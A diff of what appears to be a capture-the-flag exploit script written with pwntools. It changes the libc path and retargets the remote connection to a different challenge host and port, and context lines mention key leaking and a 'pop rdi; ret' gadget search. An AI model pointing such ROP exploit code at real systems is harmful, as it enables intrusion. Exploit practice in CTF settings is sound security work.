@@ -8,7 +8,7 @@ context.log_level = "debug"
 key = 1
 buffer_size = 1
 gadget = 1
-l = ELF('/home/youngsouk/pwn/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
+l = ELF('/root/pwn/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
 
 def get_key():
 	global key
@@ -43,7 +43,7 @@ def find_pop_rdi_gadget():
 
         log.info('pop rdi; ret; = ' + str(hex(gadget)))
 
-p = remote('dets.kro.kr', 20002)
+p = remote('0x0.site',12203)
 
 p.recvuntil('------- BINARY -------')
 
